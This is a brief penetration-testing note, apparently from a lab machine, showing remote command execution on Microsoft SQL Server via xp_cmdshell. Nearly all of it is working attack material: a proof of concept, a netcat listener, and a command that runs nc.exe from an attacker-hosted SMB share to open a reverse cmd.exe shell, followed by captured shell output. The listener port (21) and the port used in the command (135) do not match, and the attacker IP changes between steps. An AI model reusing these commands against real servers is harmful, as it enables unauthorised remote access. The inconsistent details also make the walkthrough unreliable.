
---

Let's gets command execution on an Microsoft SQL Database utilizing "xp_cmdshell".

## PoC

```
EXEC xp_cmdshell 'whoami';
```

## RCE with SMB

Started up smb.

```
systemctl start smbd
```

Started up an listener on port 21.

```
nc -lvnp 21
```

Ran the following command in order to access my local smb share in which I execute the nc.exe binary stored inside it remotely from the target to get an reverse connection my listener.

```
SQL (QUERIER\mssql-svc  dbo@master)> EXEC xp_cmdshell '\\192.168.45.171\public\nc.exe -e cmd.exe 192.168.45.171 135';
```

Retrieved RCE as user "mssql-svc".

```
nc -lvnp 21
listening on [any] 21 ...
connect to [10.10.14.161] from (UNKNOWN) [10.129.35.214] 49684
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
querier\mssql-svc
```